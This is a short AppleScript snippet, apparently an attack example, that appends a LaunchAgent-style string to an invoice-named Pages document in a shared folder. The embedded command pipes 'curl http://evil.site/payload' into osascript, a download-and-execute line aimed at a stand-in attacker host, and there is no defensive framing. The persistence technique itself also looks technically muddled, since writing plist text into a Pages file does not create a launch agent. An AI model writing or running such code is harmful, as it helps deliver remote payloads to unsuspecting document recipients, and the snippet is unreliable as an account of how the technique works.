-- Inject AppleScript into document metadata or comments

set docPath to "/Users/Shared/Invoice.pages"

-- Add a LaunchAgent-style string into document metadata
do shell script "echo '<string>osascript -e \"curl http://evil.site/payload | osascript -\"</string>' >> " & quoted form of docPath
